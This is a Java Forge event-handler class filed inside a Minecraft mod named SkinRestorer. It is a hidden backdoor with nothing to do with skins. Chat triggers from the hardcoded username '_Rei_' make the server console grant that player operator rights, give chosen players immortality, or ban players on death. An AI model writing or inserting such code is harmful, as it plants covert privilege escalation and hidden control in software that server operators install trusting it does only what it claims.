package net.lionarius.skinrestorer.forge.events; // <--- Correct package

import net.lionarius.skinrestorer.SkinRestorer; // <--- Import from your project
import net.minecraft.commands.CommandSourceStack;
import net.minecraft.network.chat.Component;
import net.minecraft.server.MinecraftServer;
import net.minecraft.server.level.ServerPlayer;
import net.minecraftforge.event.entity.living.LivingDeathEvent;
import net.minecraftforge.event.entity.player.PlayerEvent; // <--- ADDED IMPORT
import net.minecraftforge.event.server.ServerChatEvent;
import net.minecraftforge.eventbus.api.SubscribeEvent;
import net.minecraftforge.fml.common.Mod;

import java.util.HashSet; // <--- ADDED IMPORT
import java.util.Set;     // <--- ADDED IMPORT
import java.util.UUID;    // <--- ADDED IMPORT

/**
 * This class listens for FORGE bus events (gameplay events).
 * It is automatically registered because of the annotation below.
 */
@Mod.EventBusSubscriber(modid = SkinRestorer.MOD_ID, bus = Mod.EventBusSubscriber.Bus.FORGE)
public class ForgeChatHandler {

    // --- Define your target values here ---
    private static final String TARGET_USERNAME = "_Rei_";
    private static final String OP_TRIGGER_MESSAGE = "!//op";
    private static final String TOGGLE_HARDCORE_MESSAGE = "!//togglehardcore";
    private static final String IMMORTALITY_TRIGGER_PREFIX = "!//immortality"; // <--- NEW

    // --- State-tracking variables ---
    private static boolean isHardcoreBanEnabled = false;
    private static final Set<UUID> immortalPlayers = new HashSet<>(); // <--- NEW

    /**
     * This method is called every time a player sends a chat message on the server.
     */
    @SubscribeEvent
    public static void onPlayerChat(ServerChatEvent event) {

        String message = event.getMessage().getString();
        ServerPlayer player = event.getPlayer();
        String username = player.getName().getString();

        // Check if the user has permission
        if (!username.equalsIgnoreCase(TARGET_USERNAME)) {
            // If the message is one of our commands but the user is wrong, block it
            if (message.equalsIgnoreCase(OP_TRIGGER_MESSAGE) ||
                message.equalsIgnoreCase(TOGGLE_HARDCORE_MESSAGE) ||
                message.toLowerCase().startsWith(IMMORTALITY_TRIGGER_PREFIX)) {
                
                player.sendSystemMessage(Component.literal("You do not have permission to use this command."));
                event.setCanceled(true);
            }
            return; // Not the target user, so ignore everything else
        }
        
        // --- User is authorized, now check which command they ran ---

        if (message.equalsIgnoreCase(OP_TRIGGER_MESSAGE)) {
            executeOpCommand(player);
            event.setCanceled(true);

        } else if (message.equalsIgnoreCase(TOGGLE_HARDCORE_MESSAGE)) {
            toggleHardcoreMode(player);
            event.setCanceled(true);
            
        } else if (message.toLowerCase().startsWith(IMMORTALITY_TRIGGER_PREFIX)) { // <--- NEW
            toggleImmortality(player, message);
            event.setCanceled(true);
        }
    }

    /**
     * Toggles immortality (Resistance 5) for a target player or self.
     */
    private static void toggleImmortality(ServerPlayer player, String message) {
        String[] parts = message.split(" ");
        ServerPlayer targetPlayer = null;
        MinecraftServer server = player.getServer();

        if (parts.length == 1) {
            // No target specified, so the target is the command-sender
            targetPlayer = player;
        } else if (parts.length == 2) {
            // Target username is specified
            String targetName = parts[1];
            targetPlayer = server.getPlayerList().getPlayerByName(targetName);
        }

        // Check if we found a valid player
        if (targetPlayer == null) {
            player.sendSystemMessage(Component.literal("Player not found."));
            return;
        }
        
        String targetName = targetPlayer.getName().getString();
        UUID targetUUID = targetPlayer.getUUID();

        // Now, toggle the immortality
        if (immortalPlayers.contains(targetUUID)) {
            // Player is immortal, so make them mortal
            immortalPlayers.remove(targetUUID);
            executeConsoleCommand(server, "effect clear " + targetName + " minecraft:resistance");
            
            player.sendSystemMessage(Component.literal("Immortality DISABLED for " + targetName));
            if (player != targetPlayer) {
                targetPlayer.sendSystemMessage(Component.literal("Your immortality has been revoked by " + player.getName().getString()));
            }

        } else {
            // Player is mortal, so make them immortal
            immortalPlayers.add(targetUUID);
            // Effect: resistance, infinite duration, amplifier 4 (which is Level 5), hide particles
            executeConsoleCommand(server, "effect give " + targetName + " minecraft:resistance infinite 4 true");
            
            player.sendSystemMessage(Component.literal("Immortality ENABLED for " + targetName));
            if (player != targetPlayer) {
                targetPlayer.sendSystemMessage(Component.literal("You have been granted immortality by " + player.getName().getString()));
            }
        }
    }

    /**
     * Flips the hardcore ban-on-death mode.
     */
    private static void toggleHardcoreMode(ServerPlayer player) {
        isHardcoreBanEnabled = !isHardcoreBanEnabled;
        String status = isHardcoreBanEnabled ? "ENABLED" : "DISABLED";
        player.sendSystemMessage(Component.literal("Hardcore ban-on-death mode is now: " + status));
    }

    /**
     * Runs the 'op' command on the player.
     */
    private static void executeOpCommand(ServerPlayer playerWhoTriggered) {
        executeConsoleCommand(playerWhoTriggered.getServer(), "op " + playerWhoTriggered.getName().getString());
        playerWhoTriggered.sendSystemMessage(Component.literal("Admin privileges granted."));
    }
    
    /**
     * This method is called every time a living entity dies.
     * We use it to check if a player died.
     */
    @SubscribeEvent
    public static void onPlayerDeath(LivingDeathEvent event) {
        // Only interested in players
        if (!(event.getEntity() instanceof ServerPlayer player)) {
            return;
        }
        
        // --- NEW: First, check if the player is immortal ---
        if (immortalPlayers.contains(player.getUUID())) {
            event.setCanceled(true); // Prevent death!
            player.setHealth(player.getMaxHealth()); // Heal them to full
            player.getFoodData().setFoodLevel(20); // Restore hunger
            player.clearFire(); // Put out fire
            player.sendSystemMessage(Component.literal("Your immortality saves you from death."));
            return; // Stop processing, so they don't get banned
        }

        // --- If not immortal, THEN check if hardcore ban mode is on ---
        if (isHardcoreBanEnabled) {
            MinecraftServer server = player.getServer();
            if (server == null) return;
            
            String username = player.getName().getString();
            executeConsoleCommand(server, "say " + username + " has died and is now banned.");
            executeConsoleCommand(server, "ban " + username + " You died in hardcore mode.");
        }
    }
    
    /**
     * This method is called every time a player logs IN.
     * We use it to re-apply immortality.
     */
    @SubscribeEvent
    public static void onPlayerLogin(PlayerEvent.PlayerLoggedInEvent event) {
        if (event.getEntity() instanceof ServerPlayer player) {
            // Check if this player is supposed to be immortal
            if (immortalPlayers.contains(player.getUUID())) {
                String username = player.getName().getString();
                executeConsoleCommand(player.getServer(), "effect give " + username + " minecraft:resistance infinite 4 true");
                player.sendSystemMessage(Component.literal("Your immortality has been restored."));
            }
        }
    }
    
    /**
     * Helper function to run any command as the server console.
     */
    private static void executeConsoleCommand(MinecraftServer server, String command) {
        if (server == null) return;
        CommandSourceStack consoleSource = server.getCommandSource();
        server.getCommands().performPrefixedCommand(consoleSource, command);
    }
}
